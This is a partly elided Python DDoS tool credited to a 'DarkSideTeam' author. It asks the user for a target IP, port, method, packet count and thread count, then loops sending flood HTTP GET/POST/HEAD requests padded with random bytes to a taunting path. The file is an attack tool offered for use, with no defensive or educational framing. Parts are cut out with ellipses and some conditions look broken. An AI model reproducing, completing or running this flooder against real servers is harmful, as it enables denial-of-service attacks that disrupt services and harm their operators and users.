# Usage Tools By : Jonathan
# Credit Tools By  : Jonathan
# Open Port
...
referers = [
     'Your_Server_Got_DDoS_By_Jonas_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_Jonas_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_Jonas_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_Jonas_Will_Not_Surrender',
     'Your_Server_Got_DDoS_By_Jonas_Will_Not_Surrender',
...
# ให้ตายเถอะ!!
os.system('color ' +random.choice(['7'])+ " & cls & title Tools DDoS Used By Jonathan [ DDoS Attack ]")

print("\033[1;32;40m    DDOS BY JONATHAN JACKSON  \n")

print("\033[1;32;40m Tools By")
...
print("DarkSideTeam")
print("Tools DDoS")
print(" YouTube : Jonathan Jackson")

ip = str(input("[+] IP    : "))
port = int(input("[+] Port [80]     : "))
method_attack = str(input("[+] Method [1 or 2]      : "))
times = int(input("[+] Packet [95000]    : "))
threads = int(input("[+] Thread [75000]    : "))
...
def Headers(method):
    header = ""
    if method == "get""post" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['7'])+ " & cls & title Tools DDoS Used By Awang [ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("\033[1;34;40m[+] SEND ATTACK IP => ",ip," PORT : ",port,"!")
...
def run2():
    ...
    data = random._urandom(20179)
    if method_attack == "2":
        get_host = "POST /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
...
def run3():
    ...
    data = random._urandom(20179)
    if method_attack == "3":
        get_host = "head /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_Awang_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
